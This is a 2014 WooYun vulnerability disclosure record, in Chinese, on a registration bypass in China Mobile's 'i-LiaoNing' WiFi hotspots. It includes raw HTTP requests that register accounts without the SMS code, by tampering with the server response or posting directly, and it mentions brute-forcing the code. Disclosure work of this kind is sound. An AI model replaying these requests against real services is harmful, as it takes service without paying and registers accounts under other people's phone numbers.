{"id": 4948, "wybug_id": "wooyun-2014-051919", "wybug_title": "看我怎么在辽宁省内使用中国移动的“爱辽宁”WIFI热点免费上网", "wybug_corp": "中国移动", "wybug_author": "10457793", "wybug_date": "2014-02-24 23:30", "wybug_open_date": "2014-04-10 23:31", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-02-24：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-03-01：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-03-11：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-03-21：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-03-31：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-04-10：\t细节向公众公开  简要描述： 宾馆网速实在是无法忍受，无线连接i-LingNing后精彩出现了！ 详细说明：  由中国移动通信辽宁分公司版权所有的“爱辽宁”WIFI热点在辽宁省全省热点10925个，辽宁省移动联通电信用户注册后即可赠送免费20小时上网，在注册验证过程中存在逻辑错误等问题！1.正常用户在注册申请后，手机收取到6位数字密码，经过验证可以进行暴力破解。2.无需输入正确的验证码即可绕过验证直接注册账户。仅对此处进行证明！   漏洞证明：  第一步：获取验证码\n\nPOST数据如下\nPOST /portal/SendRegisterValidateMSGForward.do HTTP/1.1Host: 211.137.33.147:8088User-Agent: Mozilla/5.0 (X11; Linux i686; rv:22.0) Gecko/20100101 Firefox/22.0 Iceweasel/22.0Accept: */*Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflateContent-Type: application/x-www-form-urlencoded; charset=UTF-8X-Requested-With: XMLHttpRequestReferer: http://211.137.33.147:8088/portal/iLN/pcterminal/default/page/login.jspContent-Length: 34Cookie: JSESSIONID=37EC5F447D69FDFDC8A5B658ABE61C83; notNewUserPcCookie=notNewUserPcCookieConnection: keep-alivePragma: no-cacheCache-Control: no-cacheoperType=1&service_num=13700001111\n第二步：输入一个六位随机验证码并修改服务器响应数据，将返回数据“error”替换为“success”\n\n\n\n\n\n第三步：网页脚本已经判断验证码正确了，这时输入密码点击注册\n\n\n\n\n\n\n\n至此已经成功在没有使用手机用户13700001111接收到的验证码情况下成功注册账户，获赠20小时WIFI使用权。\n\n下面我们简化一下流程，直接POST数据注册账户第一步：post发送短信验证码的数据\nPOST /portal/SendRegisterValidateMSGForward.do HTTP/1.1Host: 211.137.33.147:8088User-Agent: Mozilla/5.0 (X11; Linux i686; rv:22.0) Gecko/20100101 Firefox/22.0 Iceweasel/22.0Accept: */*Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflateContent-Type: application/x-www-form-urlencoded; charset=UTF-8X-Requested-With: XMLHttpRequestReferer: http://211.137.33.147:8088/portal/iLN/pcterminal/default/page/login.jspContent-Length: 35Cookie: JSESSIONID=C506ABFD1C5FAD0870213C3A312CF570; notNewUserPcCookie=notNewUserPcCookieConnection: keep-alivePragma: no-cacheCache-Control: no-cacheoperType=1&service_num=13700002222\n\n\n第二步：将服务器响应的Set-Cookie里面的JSESSIONID值E726774DECBC27E121BF5BAE2C17B5BE复制下来继续POST\nPOST /portal/RegisterForward.do HTTP/1.1Host: 211.137.33.147:8088User-Agent: Mozilla/5.0 (X11; Linux i686; rv:22.0) Gecko/20100101 Firefox/22.0 Iceweasel/22.0Accept: */*Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflateContent-Type: application/x-www-form-urlencoded; charset=UTF-8X-Requested-With: XMLHttpRequestReferer: http://211.137.33.147:8088/portal/iLN/pcterminal/default/page/login.jspContent-Length: 59Cookie: JSESSIONID=E726774DECBC27E121BF5BAE2C17B5BE; notNewUserPcCookie=notNewUserPcCookieConnection: keep-alivePragma: no-cacheCache-Control: no-cacheoperType=1&service_num=13700002222&confirm_password=111111\n看，我们成功了\n\n问题分析：验证手机验证码是在本地进行的是漏洞最根本的原因！   修复方案：     版权声明：转载请注明来源 10457793@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：12  确认时间：2014-03-01 11:25 厂商回复： CNVD未能直接在北京网内复现，已经转由CNCERT下发给辽宁分中心，与http:///bugs/wooyun-2014-一并直接交由辽宁分中心协调当地运营商处置。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-02-27 13:21 |    \t\t冠威 \t\t\t( 路人 |\t\t\t        Rank:27 漏洞数:5        | 专注信息与网络安全)\t\t \n  测试成功    \n     2014-03-02 08:20 |    \t\t小震 \t\t\t( 路人 |\t\t\t        Rank:8 漏洞数:3        | ~)\t\t \n  I-LingNing?    \n     2014-04-11 13:21 |    \t\t繁星点点 \t\t\t( 路人 |\t\t\t        Rank:2 漏洞数:1        | 无)\t\t \n  楼主真的很聪明~    \n     2014-04-11 21:54 |    \t\tabaddon \t\t\t( 实习白帽子  |\t\t\t        Rank:37 漏洞数:10        | 我叫什么名字)\t\t \n  精彩我刚才想提交的漏洞复现的时候发现是说明书少页 错误以为是漏洞 悲剧 研究一个月了     \n     2014-06-08 23:31 |    \t\tenjoyhacker \t\t\t( 路人 |\t\t\t        Rank:27 漏洞数:3        | 关注信息安全！)\t\t \n  服务器传回的值到本地AJAX然后做出下一步相应出现的问题……    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 12, "Ranks": null}